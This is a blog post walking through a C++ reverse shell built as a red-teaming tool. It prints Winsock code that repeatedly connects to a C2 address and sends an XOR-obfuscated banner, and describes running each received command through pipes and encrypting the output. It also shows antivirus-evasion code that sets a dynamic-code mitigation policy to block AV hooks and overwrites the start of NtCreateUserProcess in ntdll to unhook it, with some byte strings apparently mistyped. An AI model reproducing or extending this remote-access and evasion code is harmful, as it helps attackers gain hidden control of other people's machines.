layout: post
title: "C++ Reverse Shell"
date: 2022-06-13 8:16:46 -0000
categories: Reverse-Shell, C++, obsfucation

### C++ Reverse Shell : Blog posting 0

My last C++ project was quite awhile ago, and it was really quite bad, so I was looking to make a red teaming tool that is extensible. Something I could continually pile on features to such as buildings a crypter for the program, injecting the bytes into another process, and all that other fun stuff that malware authors tend to implement. However for now, I was simply focused on building the out the core functionaility, mostly. Ideally, the goal was to include at least some very, very light network obsfucation (don't want command-line banners busting me) and unhooking CreateProcessA. 

To start, we'll init some global variable, nanespaces, and libraries:

```
#include <WinSock2.h>
#include <string>
#include <cstdio>
#include <Windows.h>
#include <ws2tcpip.h>
#pragma comment(lib,"Ws2_32.lib")

#define BUF_LEN 4096


using namespace std;

HANDLE STDIN_RD, STDIN_WR;
HANDLE STDOUT_RD, STDOUT_WR;
HANDLE STDERR_RD, STDERR_WR;
SECURITY_ATTRIBUTES seca;
SOCKET sock;
STARTUPINFOA sinfo;
PROCESS_INFORMATION pinfo;

struct addrinfo hints, * res = NULL, * ptr = NULL;

int sizer = 0;

void setupPipe(void);
void initsock(void);
void createProc(string cmdarr);
```
(Now, global variables are considered bad practice due to them being open to being re-write at any time, making it quite easy to loose track of what is altering the value of the globals in more complex projects. For this reason, the program will be getting re-organized down the line. Especially since this is more or so a first draft.)

The libraries that are absoutely required are WinSock2, Windows, amd ws2tcpip. The #pragma comment simply gives a directive to the compiler to link it as an additional library within MSVC. BUF_LEN is defined with 4096, the buffer size we will be using for network/IPC communication. The socket is declared, as well as three structures required for calling CreateProcessA.


Another structure, addrinfo is defined which we be required for initalizing the socket. A few functions are declared here as well as well as a global counter used by the XOR function that's defined later on. Again, this is bad structuring and will be refactored.

The initsock() function is the firs called in main(), so let's go over that first:

```
{
	int iresult = 0;
	bool bresult = FALSE;
	char C2Server[] = { "127.0.0.1" };
	char C2Port[] = { "8999" };



	//init vars - zero mem of struct that will contain networking information
	sock = INVALID_SOCKET;
	WSADATA wsadat;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	//init wsa - err check
	iresult = WSAStartup(MAKEWORD(2, 2), &wsadat);
	if (iresult != 0)
	{
		printf("WSA startup failed: %d\n", iresult);
	}



	//resolve dns - err check
	iresult = getaddrinfo(C2Server, C2Port, &hints, &res);
	if (iresult != 0)
	{
		printf("GetAddr failed: %d\n", iresult);
		WSACleanup();
	}

	//Create socket for connectin to server and err check
	ptr = res;
	sock = WSASocketW(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, 0, 0, 0);

	if (sock == INVALID_SOCKET)
	{
		printf("Error at socket call: %ld\n", WSAGetLastError());
		freeaddrinfo(res);
		WSACleanup();
	}
	else
	{
		char welcome[] = "[+] HELLO XSGEN";
		XOR(welcome, strlen(welcome));



		for (;;)
		{
			int r = connect(sock, ptr->ai_addr, ptr->ai_addrlen);
			if (r == 0) break;
		}
		send(sock, welcome, sizeof(welcome) - 1, 0);
	}
  ```
  
  
Some variables are define within the function, most importantly the IP and port of our C2 server. Next the WSADATA, SOCKET, and hints structure. We use the
WSADATA struct declared and pass it into WSAStartup() to initalize winsock (windows socket I/O handler). Getaddrinfo()'s role is to resolve host name from ANSI text, and the results are pushed to the res addrinfo struct. Using an additional ptr variable for handling the address info is primarily a relic of the design process and will likely be removed later on, but for now we will use it to access address information. So, with that done, we can call WSAsocketW() and use it to define our socket then check for errors. If all goes well, then the for loop will continue until a successful connection is made. A welcome message is sent upon success, how warm, right? 

Main() up to this point looks something like this:

```
int main()
{	

	//Defense
	PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dcp = {};
	dcp.ProhibitDynamicCode = 1;
	SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &dcp, sizeof(dcp));

	WriteProcessMemory(GetCurrentProcess(), GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateUserProcess"), "\0x4C\0x8B\0xD1\0xB8", 5, NULL);
	

	start:

	char buf[BUF_LEN];
	
	
	// Startup sock and WSA
	
	initsock();
  
  .... more code ....
}
  ```
  
The PROCESS_MITIGATION_DYNAMIC_CODE_POLICY is required as a paramete setting mitigation policies. Settting the dynamic code policy, also known as ACG has two primary affects.

>With ACG enabled, the Windows kernel prevents a content process from creating and modifying code pages in memory by enforcing the following policy: Code pages are immutable and prevents new unsigned code pages from being created.

After Microsoft's long war with TDL-1/2/3, they introduced their code signing policy. Now, core componets of the OS only run code signed by microsoft, which does not happen to include code produced by AV. This effectively puts AV vendors in userland, right along with us, and so this protection prevents the installation of hooks via AVs injecting their DLLs. Then, the correct bytes for the begining of CreateProcessA are rewritten to unhook it as well. This is redundant, but it's included for the sake of this being an exploratory project.

One of the larger obstacles was the implementation of light network obsfucation, which was acheived by creating a process for every command, reading it from a pipe, encrypting it, then sending the result off.

